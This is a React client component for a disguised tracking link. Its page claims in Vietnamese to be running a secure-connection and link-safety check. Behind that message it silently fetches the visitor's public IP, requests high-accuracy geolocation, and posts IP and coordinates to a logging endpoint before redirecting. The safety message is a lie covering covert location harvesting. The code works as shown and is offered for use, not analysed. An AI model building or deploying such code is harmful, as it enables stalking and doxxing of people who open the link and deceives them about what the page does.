'use client';

import { useEffect } from 'react';

interface MapRedirectClientProps {
  redirectUrl: string;
}

export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
  useEffect(() => {
    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
      }

      const logData = (pos?: GeolocationPosition) => {
        // This is from a map link, so the source is 'link'
        const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
        if (pos) {
          body.lat = pos.coords.latitude;
          body.lon = pos.coords.longitude;
          body.acc = pos.coords.accuracy;
        }

        fetch('/api/log-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        }).finally(() => {
          // Redirect to the final URL from settings after logging
          window.location.href = redirectUrl;
        });
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success callback
          () => logData(), // Error callback
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        logData(); // Geolocation not supported
      }
    };

    const timer = setTimeout(() => {
        requestLocation();
    }, 800);
    
    return () => clearTimeout(timer);
  }, [redirectUrl]);

  return (
    <div style={{
      fontFamily: 'sans-serif',
      textAlign: 'center',
      paddingTop: '100px',
      background: '#f4f7f6',
      color: '#333',
      position: 'fixed',
      inset: 0,
      zIndex: 9999,
    }}>
      <div style={{
        background: '#fff',
        padding: '40px',
        display: 'inline-block',
        borderRadius: '12px',
        boxShadow: '0 4px 10px rgba(0,0,0,0.1)'
      }}>
        <h3>Đang kết nối an toàn...</h3>
        <p>Hệ thống đang kiểm tra an toàn link, vui lòng chờ.</p>
      </div>
    </div>
  );
}
